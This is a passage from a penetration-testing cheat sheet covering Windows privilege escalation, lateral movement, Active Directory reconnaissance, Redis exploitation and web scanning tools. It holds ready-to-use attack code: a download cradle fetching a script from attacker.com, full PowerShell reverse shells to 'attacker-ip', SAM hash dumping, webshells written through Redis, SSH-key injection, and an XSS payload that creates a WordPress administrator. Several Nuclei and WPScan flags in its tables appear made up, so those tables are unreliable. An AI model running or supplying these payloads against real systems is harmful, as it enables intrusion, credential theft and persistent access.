> #### Check for always install elevated
> ```cmd
> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
> ```
#### Check for stored credentials
> ```cmd
> cmdkey /list
> dir C:\Users\username\AppData\Local\Microsoft\Credentials\
> dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
> ```
#### PowerUp enumeration
> ```powershell
> IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/PowerUp.ps1')
> Invoke-AllChecks
> ```

**Lateral Movement**

### Execute on multiple machines
> ```powershell
> $computers = Get-ADComputer -Filter * | Select -ExpandProperty Name
> Invoke-Command -ComputerName $computers -ScriptBlock { hostname }
> ```
### Pass credentials to other systems
> ```powershell
> $cred = Get-Credential
> Invoke-Command -ComputerName server2 -Credential $cred -ScriptBlock {
>  # Commands here
>}
> ```
### Copy files and execute
> ```powershell
> Copy-Item -Path payload.exe -Destination \\target\C$\Windows\Temp\
> Invoke-Command -ComputerName target -ScriptBlock {
>  C:\Windows\Temp\payload.exe
>}
> ```
### PSRemoting through multiple hops
### Enable CredSSP on source
> ```powershell
> Enable-WSManCredSSP -Role Client -DelegateComputer target.com
> ```
### Execute with CredSSP
> ```powershell
> $cred = Get-Credential
> Invoke-Command -ComputerName target.com -Credential $cred -Authentication CredSSP -ScriptBlock {
>  Invoke-Command -ComputerName target2.com -ScriptBlock { hostname }
>}
> ```

### Dump SAM hashes
> ```cmd
> reg save HKLM\SAM C:\Windows\Temp\sam
> reg save HKLM\SYSTEM C:\Windows\Temp\system
> reg save HKLM\SECURITY C:\Windows\Temp\security
> ```

**Reverse Shell**

### PowerShell reverse shell
> ```powershell
> $client = New-Object System.Net.Sockets.TCPClient('attacker-ip',4444)
> $stream = $client.GetStream()
> [byte[]]$bytes = 0..65535|%{0}
> while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
>   $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
>   $sendback = (iex $data 2>&1 | Out-String )
>   $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '
>   $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
>   $stream.Write($sendbyte,0,$sendbyte.Length)
>   $stream.Flush()
> }
> ```
### One-liner reverse shell
> ```powershell
> powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('attacker-ip',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
> ```

**Domain Reconnaissance**

### Domain information
> ```powershell
> Get-ADDomain
> [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
>```
### Domain controllers
> ```powershell
> Get-ADDomainController -Filter *
> [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().DomainControllers
> ```
### Domain users
> ```powershell
> Get-ADUser -Filter * -Properties *
> net user /domain
> ```
### Domain computers
> ```powershell
> Get-ADComputer -Filter *
> net view /domain
> ```
### Domain groups
> ```powershell
> Get-ADGroup -Filter *
> net group /domain
> ```
### Group members
> ```powershell
> Get-ADGroupMember "Domain Admins"
> net group "Domain Admins" /domain
> ```
> #### GPOs
> ```powershell
> Get-GPO -All

**Lateral Movement**

### Execute on multiple machines
> ```powershell
> $computers = Get-ADComputer -Filter * | Select -ExpandProperty Name
> Invoke-Command -ComputerName $computers -ScriptBlock { hostname }
> ```
### Pass credentials to other systems
> ```powershell
> $cred = Get-Credential
> Invoke-Command -ComputerName server2 -Credential $cred -ScriptBlock {
>  # Commands here
> }
> ```
### Copy files and execute
> ```powershell
> Copy-Item -Path payload.exe -Destination \\target\C$\Windows\Temp\
> Invoke-Command -ComputerName target -ScriptBlock {
>  C:\Windows\Temp\payload.exe
> }
> ```

---

## Redis

**Common Commands**

| Command      | Description        | Usage                        |
|--------------|--------------------|------------------------------|
| SET          | Set key value      | SET key value                |
| GET          | Get key value      | GET key                      |
| KEYS         | List keys          | KEYS *                       |
| DEL          | Delete key         | DEL key                      |
| FLUSHALL     | Delete all keys    | FLUSHALL                     |
| CONFIG GET   | Get config         | CONFIG GET *                 |
| CONFIG SET   | Set config         | CONFIG SET dir /tmp          |
| SAVE         | Save to disk       | SAVE                         |
| INFO         | Server info        | INFO                         |
| CLIENT LIST  | List clients       | CLIENT LIST                  |
| SLAVEOF      | Set replication    | SLAVEOF host port            |
| MODULE LOAD  | Load module        | MODULE LOAD /path/to/module.so|

**Common Credentials**

| Username       | Password        |
|----------------|-----------------|
| admin          | admin           |
| administrator  | administrator   |
| root           | root            |
| user           | user            |
| test           | test            |
| redis          | redis           |

### Basic log in
> ```bash
> redis-cli -h <hostname> -p <port-number> --user <username> -a <password>
> ```

### Uploading a webshell through redis

- ### Method 1: PHP webshell
> ```bash
> redis-cli -h target.com
>> flushall
>> set shell '<?php system($_REQUEST["cmd"]); ?>'
>> config set dbfilename shell.php
>> config set dir /var/www/html
>> save
> ```
> # Access: http://target.com/shell.php?cmd=whoami

- ### Method 2: ASP.NET webshell
> ```bash
>> set shell '<%@ Page Language="C#" %><%@ Import Namespace="System.Diagnostics" %><%Process.Start(Request["cmd"]);%>'
>> config set dbfilename shell.aspx
>> config set dir C:\\inetpub\\wwwroot
>> save
> ```
- ### Method 3: JSP webshell
> ```bash
>> set shell '<%Runtime.getRuntime().exec(request.getParameter("cmd"));%>'
>> config set dbfilename shell.jsp
>> config set dir /var/www/html
>> save
> ```

### Injecting SSH

- ### Generate SSH key
> ```bash
> ssh-keygen -t rsa -f redis_key
> ```
- ### Prepare key with newlines
> ```bash
> (echo -e "\n\n"; cat redis_key.pub; echo -e "\n\n") > key.txt
> ```
- ### Inject into authorized_keys
> ```bash
> redis-cli -h target.com flushall
> cat key.txt | redis-cli -h target.com -x set ssh_key
> redis-cli -h target.com config set dbfilename authorized_keys
> redis-cli -h target.com config set dir /root/.ssh
> redis-cli -h target.com save
> ```
# Alternative paths
1. /home/redis/.ssh/authorized_keys
2. /home/ubuntu/.ssh/authorized_keys
3. /var/lib/redis/.ssh/authorized_keys

- ### Connect via SSH
> ```bash
> ssh -i redis_key root@target.com
> ```

### Using [Redis Rogue Server](https://github.com/n0b0dyCN/redis-rogue-server)

> ```bash
> # 1. Clone the rpository
> git clone https://github.com/n0b0dyCN/redis-rogue-server
> # 2. Build the code
> cd RedisModulesSDK/exp/
> make
> # 3. Copy the .so file to same folder with redis-rogue-server.py
> # 4. For an interactive shell
> ./redis-rogue-server.py --rhost <target> --lhost <attacker>
> # 5. For reverse shell, set up a nc listener
> ```

---

## Web Testing

**Fingerprinting**

### Web Technology Detection
- ### Detect technologies used by the target website
> ```bash
> whatweb -a 3 [TARGET_IP]
> ```
- ### Obtain SSL certificate information
> ```bash
> openssl s_client -connect <target_domain>:443
> ```
- ### Use BuiltWith to gather detailed technology profile
> ```bash
> builtwith [TARGET_IP]
> ```

**Scanners**
## Nikto
- ### Installation
> ```bash
> sudo apt-get install nikto
> ```
- ### Standard Command to Scan Websites
> ```bash
> nikto –host (web url host name) –(http port number)
> ```
- ### Scan Options
> ```bash
> nikto –h (Hostname/IP address)            # Scan a host
> nikto -h -port (Port Number1),(Port Number2)  # Scan host targeting specific ports
> nikto -h (Hostname) -maxtime (seconds)    # Define maximum scan time
> nikto -h-until                           # Scan duration
> nikto -h-vhost                           # Define host header
> nikto -h-no404                           # Skip http 404 guessing
> nikto -h-nossl                           # Stop using SSL during scan
> nikto -h-ssl                             # Force to use SSL
> nikto -update                            # Update scan engine plugins
> nikto -h-dbcheck                         # Check database
> nikto -h (Hostname/IP address) -output (filename)  # Input output to a file
> nikto -h-useproxy (Proxy IP address)     # Web host scan via a proxy
> nikto -h-config (filename.conf)          # Use a specified file as a database
> nikto -h-nolookup                        # Stop DNS lookup for hosts
> nikto -h-nocache                         # Stop caching responses for scans
> ```
- ### Display Options
> ```bash
> nikto -h -Display (option)
> 1    # Display redirects
> 2    # Display cookies
> 3    # Display 200 OK response
> 4    # Display Web URLs requiring authentication
> D    # Display debug output
> E    # Show HTTP errors
> P    # Print to STDOUT
> V    # Verbose output display
> ```
- ### Output Options
> ```bash
> nikto -h -Format
> csv  # Comma Separated Value
> htm  # HTML Format
> txt  # Plain text
> xml  # XML Format
> ```
- ### Tuning Options
> ```bash
> nikto -h (Hostname) -tuning (Option)
> 0    # Upload files
> 7    # Remote File Retrieval - Server Wide
> 1    # View specific file in log
> 8    # Command Execution / Remote Shell
> 2    # Default file misconfiguration
> 9    # SQL Injection
> 3    # Display information disclosure
> a    # Authentication Bypass
> 4    # Injection (XSS/Script/HTML)
> b    # Software Identification
> 5    # Remote File Retrieval - Inside Web Root
> c    # Remote Source Inclusion
> 6    # Denial of Service
> x    # Reverse Tuning Options
> ```

## Nuclei

### Common Nuclei Commands

- ### Basic Usage
> ```bash
> nuclei -u https://example.com
> ```
- ### Scanning from a File
> ```bash
> nuclei -l targets.txt
> ```
- ### Using Custom Templates
> ```bash
> nuclei -t /path/to/templates/
> ```
- ### Scanning for CVEs
> ```bash
> nuclei -t cves/ -l targets.txt
> ```

| Command                           | Example Usage                                          | Function                                                   | Output Example                             |
|-----------------------------------|--------------------------------------------------------|-----------------------------------------------------------|--------------------------------------------|
| **Basic Scan**                    | ```nuclei -u https://example.com```                     | Initiates a basic scan on the specified target URL.        | Scanning https://example.com...             |
| **Scanning from a File**          | ```nuclei -l targets.txt```                            | Scans multiple targets listed in a file.                   | Scanning targets from targets.txt...       |
| **Using Custom Templates**        | ```nuclei -t /path/to/templates/```                    | Uses custom or additional templates from a specified directory. | Using templates from /path/to/templates/    |
| **Scanning for CVEs**             | ```nuclei -t cves/ -l targets.txt```                   | Scans for vulnerabilities related to CVEs using CVE-specific templates. | Scanning for CVEs...                        |
| **Outputting Results to a File**  | ```nuclei -u https://example.com -o output.txt```      | Saves scan results to a specified file for later analysis.  | Results saved to output.txt                |
| **Verbose Output**                | ```nuclei -u https://example.com -v```                 | Provides detailed information about the scanning process.  | Verbose mode enabled.                     |
| **Silent Mode**                   | ```nuclei -u https://example.com -silent```            | Runs the scan without displaying output on the console.    | Running scan in silent mode.              |
| **Displaying Version**            | ```nuclei -version```                                  | Displays the current version of Nuclei installed.          | Nuclei version 2.0.0                       |
| **Updating Nuclei**               | ```nuclei -update```                                   | Updates the Nuclei tool to the latest version available.   | Nuclei updated to the latest version.     |
| **Help and Usage Information**    | ```nuclei -h```                                        | Displays help information and a list of available commands. | Usage: nuclei [options]                   |
| **Specify Multiple Targets**     | ```nuclei -l targets.txt -t /path/to/templates/```     | Scans multiple targets with specified templates.           | Scanning targets from targets.txt...       |
| **Timeout for Requests**          | ```nuclei -u https://example.com -timeout 5```         | Sets a timeout duration for requests during the scan.      | Timeout set to 5 seconds.                  |
| **Custom User-Agent**             | ```nuclei -u https://example.com -ua "CustomUserAgent"``` | Sets a custom User-Agent string for requests.              | Using custom User-Agent: CustomUserAgent  |
| **Output JSON Format**            | ```nuclei -u https://example.com -json```              | Outputs scan results in JSON format.                       | Results saved in JSON format.             |
| **Resume Previous Scan**         | ```nuclei -resume session.json```                      | Resumes a previously interrupted scan using a session file. | Resuming scan from session.json...         |
| **Health Check**                  | ```nuclei -health```                                   | Performs a diagnostic check on the Nuclei tool.            | Nuclei is functioning correctly.           |
| **Include/Exclude Templates**     | ```nuclei -t /path/to/templates/ -exclude exclude.yaml``` | Includes or excludes specific templates during the scan.   | Excluding templates in exclude.yaml       |
| **Use Custom DNS Resolvers**      | ```nuclei -u https://example.com -r resolvers.txt```   | Specifies custom DNS resolvers for the scan.              | Using DNS resolvers from resolvers.txt    |
| **Rate Limiting**                 | ```nuclei -u https://example.com -rl 10```             | Limits requests sent per second during the scan.           | Rate limit set to 10 requests per second.  |
| **Store HTTP Responses**          | ```nuclei -u https://example.com --store-requests```   | Stores HTTP requests and responses during the scan.       | HTTP requests and responses stored.       |
| **Firewall Detection**            | ```nuclei -u https://example.com --detect-firewall```  | Detects the presence of a firewall and assesses its impact on scanning. | Detecting firewall presence...            |
| **Finding Common Log Files**      | ```nuclei -u https://example.com --find-logs```        | Searches for common log files on the target site.          | Searching for log files...                |
| **Finding Common Backup Files**   | ```nuclei -u https://example.com --find-backups```     | Searches for common backup files on the target site.       | Searching for backup files...             |
| **Enumerate Users**               | ```nuclei -u https://example.com --enum-users```       | Lists registered users on the target site.                | Enumerating users...                      |
| **Check for Vulnerabilities**     | ```nuclei -u https://example.com --check-vulns```      | Scans for known vulnerabilities in web components.         | Scanning for vulnerabilities...           |
| **Enumerate Plugins and Extensions** | ```nuclei -u https://example.com --enum-plugins```    | Enumerates installed plugins and extensions.               | Enumerating plugins and extensions...     |
| **Brute Force Testing**           | ```nuclei -u https://example.com --brute --wordlist wordlist.txt``` | Performs brute force attacks to test password strength.     | Brute forcing with wordlist.txt...         |
| **Check Configuration**           | ```nuclei -u https://example.com --check-config```     | Checks for insecure configurations and misconfigurations.  | Checking configuration...                |

## WPScan

### Common Commands
- ### Basic Scan
> ```bash
> wpscan --url http://example.com
> ```
- ### Enumerating Plugins
> ```bash
> wpscan --url http://example.com --enumerate p
> ```
- ### Enumerating Themes
> ```bash
> wpscan --url http://example.com --enumerate t
> ```
- ### Enumerating Users
> ```bash
> wpscan --url http://example.com --enumerate u
> wpscan -u “http://<IP-ADDRESS>/” --username <username> -w /usr/share/seclist/Usernames/xato-usernames-top-1millions-20000.txt
> ```
- ### Brute Forcing
> ```bash
> wpscan --url http://<IP-ADDRESS>/wp/wp-login.php -U Admin --passwords /usr/share/wordlists/rockyou.txt --password-attack wp-login
> ```

| Command                         | Example Usage                                              | Function                                                       | Output Example                            |
|---------------------------------|------------------------------------------------------------|---------------------------------------------------------------|-------------------------------------------|
| **Basic Usage**                 | ```wpscan --url https://example.com```                      | Initiates a basic scan of the specified WordPress site.        | Crawling https://example.com...            |
| **Display Help**                | ```wpscan --help```                                         | Displays help information and available commands.              | Usage: wpscan [options]                   |
| **Display Version**             | ```wpscan --version```                                      | Displays the current version of WPScan installed.              | WPScan version 3.8.0                      |
| **Update WPScan**               | ```wpscan --update```                                       | Updates the WPScan tool to the latest version.                 | WPScan updated to the latest version.    |
| **Using an API Token**          | ```wpscan --url https://example.com --api-token YOUR_API_TOKEN``` | Allows enhanced features with an API token.                    | Using API token for enhanced data...     |
| **Enumerate All Available Options** | ```wpscan --url https://example.com --enumerate ap,at,au``` | Enumerates all available options, including plugins, themes, and users. | Enumerating all available options...      |
| **Enumerate Plugins**           | ```wpscan --url https://example.com --enumerate p```        | Enumerates installed plugins on the target site.               | Enumerating plugins...                   |
| **Enumerate Themes**            | ```wpscan --url https://example.com --enumerate t```        | Enumerates installed themes on the target site.                | Enumerating themes...                    |
| **Enumerate Users**             | ```wpscan --url https://example.com --enumerate u```        | Enumerates users registered on the target WordPress site.      | Enumerating users...                     |
| **Check for Vulnerabilities**   | ```wpscan --url https://example.com --plugins-detection mixed``` | Checks for known vulnerabilities in detected plugins.           | Scanning for vulnerabilities...          |
| **Check for Specific Vulnerabilities** | ```wpscan --url https://example.com --vulnerable``` | Checks for specific vulnerabilities listed in the database.    | Checking for known vulnerabilities...     |
| **Brute Force Enumeration**     | ```wpscan --url https://example.com --brute --wordlist wordlist.txt``` | Uses brute force to discover usernames or passwords.           | Brute forcing usernames...               |
| **Use Proxy**                   | ```wpscan --url https://example.com --proxy http://proxy.example.com``` | Uses a specified proxy for requests.                          | Using proxy: http://proxy.example.com     |
| **Custom User-Agent**           | ```wpscan --url https://example.com --user-agent "CustomUserAgent"``` | Sets a custom User-Agent string for requests.                  | Using custom User-Agent: CustomUserAgent |
| **Rate Limiting**               | ```wpscan --url https://example.com --rate-limit 5```       | Limits the number of requests sent per second.                 | Rate limit set to 5 requests per second. |
| **Output Results to a File**    | ```wpscan --url https://example.com -o output.txt```        | Outputs the scan results to a specified file.                  | Results saved to output.txt              |
| **Output JSON**                 | ```wpscan --url https://example.com --output-json```        | Outputs results in JSON format.                                | Results saved in JSON format.            |
| **Store HTTP Responses**        | ```wpscan --url https://example.com --store-requests```     | Stores HTTP requests and responses during the scan.            | HTTP requests and responses stored.      |
| **Verbose Mode**                | ```wpscan --url https://example.com --verbose```            | Enables verbose output for detailed information.              | Verbose mode enabled.                    |
| **Resume Scan**                 | ```wpscan --url https://example.com --resume resume.cfg```  | Resumes a scan using a previous session configuration file.    | Resuming scan from resume.cfg...         |
| **Exclude Specific Paths**      | ```wpscan --url https://example.com --exclude-path /wp-admin``` | Excludes specified paths from the scan.                        | Excluding path: /wp-admin                |

- ### Gather WordPress Nonce: to attack with a HttpOnly cookie on WordPress: We need to create a Js function that fetches the nonce which is a server generated token to prevent CSRF attacks
> ```javascript
> var request = new XMLHttpRequest();
> var targetURL = "/wp-admin/user-new.php";
> var regex = /name="([^"]*?)"/g;
> request.open("GET", targetURL, false);
> request.send();
> var match = regex.exec(request.responseText);
> var nonce = match[1];
> ```
- ### Create New WordPress Admin Account
> ```javascript
> var params = "action=createuser&_wpnonce_create-user=" + nonce + "&user_login=newadmin&email=newadmin@example.com&pass1=newpassword&pass2=newpassword&role=administrator";
> var request = new XMLHttpRequest();
> request.open("POST", targetURL, true);
> request.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
> request.send(params);
> ```
- ### Compress the JavaScript Code: use the tool JSCompress  -  https://jscompress.com/
> ```javascript
> var params = "action=createuser&_wpnonce_create-user=" + nonce + "&user_login=newadmin&email=newadmin@example.com&pass1=newpassword&pass2=newpassword&role=administrator";
> var request = new XMLHttpRequest();
> request.open("POST", targetURL, true);
> request.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
> request.send(params);
> ```
- ### Encode the JavaScript Payload: use the following JS function.
> ```javascript
> function toJavaScriptEncoding(str) {
>     var result = '';
>     for (var i = 0; i < str.length; i++) {
>         result += str.charCodeAt(i);
>         if (i !== str.length - 1) {
>             result += ",";
>         }
>     }
>     return result;
> }
> 
> let encodedPayload = toJavaScriptEncoding('insert_minified_javascript');
> console.log(encodedPayload);
> ```
- ### Request and Execute the Payload: the function eval is responsible for interpreting the string as code and execute it.
> ```bash
> curl -i http://example.com --user-agent "<script>eval(String.fromCharCode(<resultFromRunningAboveScritpToEncode>))</script>" --proxy 127.0.0.1:8080
> ```

## Curl

### Basic Requests
> - GET Request
> ```bash
> curl http://example.com
> ```

> - GET Request with Custom Headers
> ```bash 
> curl -H "Accept: application/json" http://example.com
> ```

### Data Submission
> - POST Request with Form Data
> ```bash
> curl -X POST -d "param1=value1&param2=value2" http://example.com/submit
> ```

> - POST Request with JSON Data
> ```bash
> curl -H "Content-Type: application/json" -X POST -d '{"key1":"value1", "key2":"value2"}' http://example.com/api
> ```

> - Automatically Perform URL Encoding
> ```bash
> curl -X POST -d "param1=value1&param2=value2" --data-urlencode http://example.com/submit
> ```
> - PUT Request with Form Data
> ```bash
> curl -X PUT -d "param1=value1&param2=value2" http://example.com/update
> ```
> - DELETE Request
> ```bash
> curl -X DELETE http://example.com/delete
> ```

### Authentication and Headers
> - Basic Authentication
> ```bash
> curl -u username:password http://example.com
> ```
> - Custom User-Agent
> ```bash
> curl -A "CustomUserAgent/1.0" http://example.com
> ```

### Response Handling
> - Include Response Headers
> ```bash
> curl -i http://example.com
> ```

> - Save Response to File
> ```bash
> curl -o filename.html http://example.com
> ```
    
> - Show Response Headers Only
> ```bash
> curl -I http://example.com
> ```
    
> - Print Response Body Only
> ```bash
> curl -s http://example.com
> ```

> - Show Detailed Request and Response
> ```
> curl -v http://example.com
> ```

### Cookies and Session Management
> - Send Cookies
> ```bash
> curl -b "cookie1=value1; cookie2=value2" http://example.com
> ```

> - Save Cookies to File
> ```bash
> curl -c cookies.txt http://example.com
> ```

> - Load Cookies from File
> ```bash
> curl -b cookies.txt http://example.com
> ```

### File Operations
> - Upload a File
> ```bash
> curl -F "file=@path/to/file" http://example.com/upload
> ```

> - Download a File with Resume Support
> ```bash
> curl -C - -o filename http://example.com/file
> ```

### Proxy and Security
> - Use a Proxy
> ```bash
> curl -x http://proxyserver:port http://example.com
> ```

> - Use HTTPS and Insecure SSL
> ```bash
> curl -k https://example.com
> ```

### Additional Options
> - Follow Redirects
> ```bash
> curl -L http://example.com
> ```
    
> - Set Timeout
> ```bash
> curl --max-time 30 http://example.com
> ```
    
> - Show Only Response Code
> ```bash
> curl -s -o /dev/null -w "%{http_code}" http://example.com
> ```
    
> - Use HTTP/2
> ``` bash
> curl --http2 http://example.com
> ```

**Directory Discovery**

## FFUF

| Command                            | Example Usage                                                | Function                                                        | Output Example                             |
|------------------------------------|--------------------------------------------------------------|----------------------------------------------------------------|--------------------------------------------|
| **URL to Fuzz**                    | ```ffuf -u http://target.com/FUZZ```                          | Specifies the target URL with FUZZ as a placeholder.           | Target: http://target.com/admin            |
| **Wordlist**                       | ```ffuf -w /path/to/wordlist.txt```                           | Specifies the wordlist to use for fuzzing.                     | Using wordlist: /path/to/wordlist.txt      |
| **Use Multiple Wordlists**         | ```ffuf -w /path/to/wordlist1.txt:/path/to/wordlist2.txt```   | Allows multiple wordlists for fuzzing.                         | Found: /login/                             |
| **HTTP Method**                    | ```ffuf -X POST```                                           | Specifies the HTTP method for fuzzing.                         | POST /api/login                            |
| **Custom HTTP Headers**            | ```ffuf -H "Authorization: Bearer token"```                  | Sets custom HTTP headers for the request.                      | Authorization header sent                 |
| **Custom User-Agent**              | ```ffuf -H "User-Agent: CustomAgent"```                       | Specifies a custom User-Agent header.                          | User-Agent: CustomAgent                    |
| **Use Proxy**                      | ```ffuf -x http://proxy:8080```                              | Sends requests through a specified proxy.                      | Proxy: http://proxy:8080                   |
| **Follow Redirects**               | ```ffuf -r```                                                | Follows HTTP redirects during fuzzing.                         | Following redirects                        |
| **Set Delay Between Requests**     | ```ffuf -d 2```                                              | Sets a delay in seconds between each request.                  | Request delay: 2 seconds                   |
| **Limit Concurrent Requests**      | ```ffuf -p 10```                                             | Limits the number of concurrent requests.                      | 10 concurrent requests in progress        |
| **Timeout**                         | ```ffuf -t 60```                                             | Sets the request timeout in seconds.                           | Timeout set to 60 seconds                  |
| **Match HTTP Status Codes**        | ```ffuf -mc 200```                                           | Filters results to show only specific HTTP status codes.       | 200: /home/                                |
| **Filter HTTP Status Codes**       | ```ffuf -fc 404```                                           | Filters out results with specific HTTP status codes.           | 200: /secret.php                          |
| **Filter by Content Size**         | ```ffuf -fs 4242```                                          | Filters results based on content size.                         | Filtered: 4242 bytes                       |
| **Filter by Line Count**           | ```ffuf -fl 42```                                            | Filters results based on the number of lines.                  | Filtered: 42 lines                         |
| **Filter by Word Count**           | ```ffuf -fw 1337```                                          | Filters results based on the number of words.                  | Filtered: 1337 words                       |
| **Filter by Regex**                | ```ffuf -fr "regex"```                                       | Filters results based on a regex pattern.                      | Filtered: regex match                      |
| **Auto-calibration**               | ```ffuf -ac```                                               | Automatically calibrates filters based on baseline requests.   | Auto-calibration complete                  |
| **Auto-calibration Strategy**      | ```ffuf -acs mode```                                         | Sets the auto-calibration strategy (e.g., basic, advanced).    | Auto-calibration strategy: basic           |
| **Enable Recursive Mode**          | ```ffuf -recursion```                                        | Enables recursive scanning within discovered directories.      | Discovered: /admin/login/                  |
| **Recursion Depth**                | ```ffuf -recursion-depth 2```                                | Sets the maximum recursion depth.                              | Recursion depth set to 2                   |
| **Stop on First Match**            | ```ffuf -sf```                                               | Stops the fuzzing process after the first match is found.      | Stopped after first match: /admin         |
| **Stop on Spelling Error**         | ```ffuf -ss```                                               | Stops fuzzing on spelling errors.                              | Stopped on spelling error                  |
| **Ignore Wordlist Comments**       | ```ffuf -ignore-wordlist-comments```                         | Ignores lines starting with `#` in the wordlist.               | Comments ignored in wordlist               |
| **Verbose Mode**                   | ```ffuf -v```                                                | Enables verbose output during fuzzing.                         | Request: /FUZZ sent, response: 200        |
| **Quiet Mode**                     | ```ffuf -s```                                                | Suppresses the banner and only prints results.                | Quiet mode enabled                        |
| **Color Output**                   | ```ffuf -c```                                                | Enables colorized output in the terminal.                     | Colorized output                          |
| **Show All Status Codes**          | ```ffuf -ac-all```                                           | Displays all HTTP status codes, including non-200 responses.  | Displayed all HTTP status codes           |
| **Output to File**                 | ```ffuf -o output.json```                                    | Outputs results to a specified file.                           | Results saved to output.json              |
| **Output Format**                  | ```ffuf -of json```                                          | Specifies the output format (e.g., json, ejson, html, md, csv). | Output format: json                       |
| **Input from File**                | ```ffuf -input-cmd "cat input.txt"```                        | Reads input from a file instead of standard input.             | Input read from file                       |

### Examples of usage
- ###Basic Subdomain fuzzing
> ```bash
> ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/combined_subdomains.txt -u http://<IP-ADDRESS -H "Host: FUZZ.<IP-ADDRESS>" -t 200 -ic -fw 18
>
- ###Filter to show only 200 or 3xx responses
> ```bash
> ffuf -w /path/to/wordlist.txt -u http://target/FUZZ -mc 200,300-399
> ```
- ### Output results to a file
> ```bash
> ffuf -w /path/to/wordlist.txt -u http://target/FUZZ -o results.txt
> ```
- ### Recursive directory fuzzing
> ```
> ffuf -w /path/to/wordlist.txt -u http://target/FUZZ -recursion
> ```
- ### Set number of threads
> ```bash
> ffuf -w /path/to/wordlist.txt -u http://target/FUZZ -t 50
> ```
- ### Use proxy
> ```bash
> ffuf -w /path/to/wordlist.txt -u http://target/FUZZ -x http://127.0.0.1:8080
> ```
- ### Use a delay between requests
> ```bash
> ffuf -w /path/to/wordlist.txt -u http://target/FUZZ -p 0.1-0.5
> ```
- ### Set request timeout
> ```bash
> ffuf -w /path/to/wordlist.txt -u http://target/FUZZ -timeout 10
> ```
- ### Match response size
> ```bash
> ffuf -w /path/to/wordlist.txt -u http://target/FUZZ -fs 4242
> ```
- ###Basic file fuzzing
> ```bash
> ffuf -w /path/to/wordlist.txt -u http://target/FUZZ
> ```
- ### Filter to show only 200 or 3xx responses
> ```bash
> ffuf -w /path/to/wordlist.txt -u http://target/FUZZ -mc 200,300-399
> ```
- ### Specify extensions
> ```bash
> ffuf -w /path/to/wordlist.txt:FUZZ -u http://target/FUZZ.html,http://target/FUZZ.php -mc 200,300-399
> ```
- ### Output results to a file
> ```bash
> ffuf -w /path/to/wordlist.txt -u http://target/FUZZ -o results.txt
> ```
- ### Set number of threads
> ```bash
> ffuf -w /path/to/wordlist.txt -u http://target/FUZZ -t 50
> ```
- ### Use proxy
> ```bash
> ffuf -w /path/to/wordlist.txt -u http://target/FUZZ -x http://127.0.0.1:8080
> ```
- LFI Fuzzing
- ### Normal Fuzzing
> ```bash
> ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=FUZZ' -fs 2287
> ```
- ### Fuzz GET parameters
> ```bash
> ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?FUZZ=value' -fs 2287
> ```
- ### Fuzz PHP files
> ```bash
> ffuf -w /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://<SERVER_IP>:<PORT>/FUZZ.php
> ```
- ### Fuzz Webroot: to fuzz for index.php use wordlist for Linux or wordlist for windows, or this general wordlist alternative; consider that depending on our LFI situation, we may need to add a few back directories (e.g. ../../../../), and then add our index.php afterwords.
> ```bash
> ffuf -w /opt/useful/SecLists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php' -fs 2287
> ```
- ### Fuzz Server Logs and Configs: we can use the same wordlists as before
> ```bash
> ffuf -w ./LFI-WordList-Linux:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ' -fs 2287
> ```
- ### For Subdomain Discovery
> ```bash
> ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/combined_subdomains.txt -u http://<IP Address> -H "Host: FUZZ.<IP Address>" -t 200 -ic -fw 18
> ```

## Dirb

- ### Basic directory scanning
> ```bash
> dirb http://target /path/to/wordlist.txt
> ```
- ### Save output to a file
> ```bash
> dirb http://target /path/to/wordlist.txt -o results.txt
> ```
- ### Use custom user-agent
> ```bash
> dirb http://target /path/to/wordlist.txt -a "Mozilla/5.0"
> ```
- ### Ignore non-existent pages
> ```bash
> dirb http://target /path/to/wordlist.txt -N
> ```
- ### Scan SSL (HTTPS)
> ```bash
> dirb https://target /path/to/wordlist.txt
> ```
- ### Recursively scan directories
> ```bash
> dirb http://target /path/to/wordlist.txt -r
> ```
- ### Exclude specific status codes
> ```bash
> dirb http://target /path/to/wordlist.txt -n -X .php,.html,.txt
> ```
- ### Example usage
> ```bash
> dirb http://target.com
> ```
- ### Basic file scanning with default extensions
> ```bash
> dirb http://target /path/to/wordlist.txt -X .php,.html,.txt
> ```
> ### Save output to a file
> ```bash
> dirb http://target /path/to/wordlist.txt -X .php,.html,.txt -o results.txt
> ```
- ### Use custom user-agent
> ```bash
> dirb http://target /path/to/wordlist.txt -X .php,.html,.txt -a "Mozilla/5.0"
> ```
- ### Ignore non-existent pages
> ```bash
> dirb http://target /path/to/wordlist.txt -X .php,.html,.txt -N
> ```
- ### Scan SSL (HTTPS)
> ```bash
> dirb https://target /path/to/wordlist.txt -X .php,.html,.txt
> ```

## Gobuster

| Command                         | Example Usage                                                  | Function                                                     | Output Example                             |
